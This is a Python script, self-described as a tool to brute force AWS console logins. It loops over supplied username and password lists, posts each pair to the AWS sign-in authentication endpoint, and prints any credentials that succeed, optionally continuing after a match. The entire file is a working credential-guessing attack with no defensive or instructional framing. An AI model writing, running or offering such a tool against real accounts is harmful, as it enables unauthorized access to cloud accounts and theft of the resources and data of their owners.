import requests
import json
import argparse
from sys import exit




def Parser():
    parser = argparse.ArgumentParser(description='Simple script to brute force AWS console login')
    parser.add_argument('userfile', type=str, help='File containing user emails')
    parser.add_argument('passfile', type=str, help='File containing passwords')
    parser.add_argument('-a', '--account', nargs=1, help='AWS account ID')
    parser.add_argument('-c', '--continue_on_success', action='store_true', help='Continue if a match is found')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    return parser



class Bruter():

    def __init__(self, account_id, verbose):
        self.account = account_id
        self.verbose = verbose
        self.headers = {
            'Referer': 'https://signin.aws.amazon.com'
        }
        self.data = {
            'action': 'iam-user-authentication',
            'account': account_id,
            'username': 'console_user',
            'password': 'password',
            'client_id': 'arn:aws:signin:::console/canvas',
            'redirect_uri': 'https://console.aws.amazon.com/console/home',
        }
        self.reset = '\033[0m'
        self.green = '\033[32m'
        self.yellow = '\033[33m'
        self.blue = '\033[34m'
        self.red = '\033[31m'


    def brute_force(self, user_list, password_list, continue_on_success):
        print(f'Starting brute force attack against AWS account {self.blue}{self.account}{self.reset}')
        print('<----------------------------------------------------------------->')
        try:
            with open(user_list, 'r') as f:
                users = f.read()

            with open(password_list, 'r') as w:
                passwords = w.read()
        except FileNotFoundError:
            print(f'One of the supplied files can not be found!')
            print(f'{self.red}{user_list}{self.reset}')
            print(f'{self.red}{password_list}{self.reset}')
            exit(1)

        for user in users.split("\n"):
            for password in passwords.split("\n"):
                if verbose:
                    print("")
                    print(f"Trying: {self.yellow}{user}:{password}{self.reset}")

                self.data['username'] = user
                self.data['password'] = password
                response = requests.post('https://signin.aws.amazon.com/authenticate', headers=self.headers, data=self.data)
                data = json.loads(response.text)

                if verbose:
                    print(f'Response: {data}')

                if data['state'] == 'FAIL':
                    continue
                elif data['state'] == 'SUCCESS':
                    print(f'Credentials found: {self.green}{user}:{password}{self.reset}')
                    if not continue_on_success:
                        exit(0)



parser = Parser()
args = parser.parse_args()


if args.account:
    a = args.account[0]

    if args.verbose:
        verbose = True
    else:
        verbose = False

    b = Bruter(a, verbose)

    if args.continue_on_success:
        continue_on_success = True
    else:
        continue_on_success = False

    b.brute_force(args.userfile, args.passfile, continue_on_success)
else:
    parser.print_help()
